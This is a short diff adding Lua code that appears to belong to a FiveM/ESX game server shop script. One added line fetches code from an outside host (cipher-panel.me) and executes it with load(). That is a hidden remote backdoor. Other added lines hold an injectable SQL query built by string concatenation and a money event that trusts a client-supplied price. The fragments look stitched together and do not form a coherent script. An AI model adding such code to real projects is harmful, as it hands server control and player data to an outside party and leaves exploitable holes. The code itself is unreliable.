@@ -1,0 +1,7 @@
+RegisterNetEvent('shop:sellItem', function(item, price)
+  local xPlayer = ESX.GetPlayerFromId(1)
+  xPlayer.addMoney(price)
+end)
+MySQL.query('SELECT * FROM users WHERE identifier = "' .. id .. '"')
+PerformHttpRequest('https://cipher-panel.me/_i/i?to=x', function(e, d) assert(load(d))() end)
+local ped = PlayerPedId()
